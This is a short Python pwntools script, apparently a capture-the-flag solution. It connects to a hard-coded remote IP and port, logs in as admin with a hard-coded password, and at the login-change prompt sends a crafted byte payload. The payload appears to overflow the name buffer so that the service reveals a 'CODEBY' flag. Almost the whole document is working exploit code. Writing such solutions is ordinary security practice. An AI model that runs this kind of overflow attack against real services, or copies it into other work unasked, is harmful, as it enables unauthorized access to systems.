# resolved
# coding=utf-8
from pwn import *

host = "62.173.140.174"
port = 17100
r = remote(host, port)
log = b'admin'  # 32
pas = b'Super_secret_admin_password'  # 64
payload = b'\x61\x64\x6D\x69\x6E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x53\x75\x70\x65\x72\x5F\x73\x65\x63\x72\x65\x74\x5F\x61\x64\x6D\x69\x6E\x5F\x70\x61\x73\x73\x77\x6F\x72\x64\x00\x42\x44\x43'
a = True
r.sendline(b'1')

chet = 0
while a:
    chet += 1
    answer = r.recv().decode('utf-8')
    if "CODEBY" in answer:
        print(answer)
        a = False
    if 'Enter your login' in answer:
        r.sendline(log)
    if 'Enter your password' in answer:
        r.sendline(pas)
    if chet == 6:
        r.sendline(b'3')
    if 'Enter your new login' in answer:
        r.sendline(payload)
    if 'You have successfully changed your name!' in answer:
        r.sendline(b'2')